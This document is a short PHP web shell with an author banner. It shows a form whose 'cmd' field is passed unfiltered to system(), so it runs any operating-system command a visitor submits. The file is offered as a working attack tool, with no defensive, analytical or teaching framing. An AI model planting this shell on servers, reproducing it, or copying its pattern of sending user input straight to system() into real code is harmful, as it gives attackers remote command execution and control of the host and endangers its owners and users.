<?php 

 echo '<h2>Cod3d By Abdallah Mohamed Elsharif</h2><br>';
 
 echo '<form action="" method="get">';
 echo '<input type="text" name="cmd" size="50"><input name="submit" type="submit" value="Execute"></form>';

 if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
 }
 
?>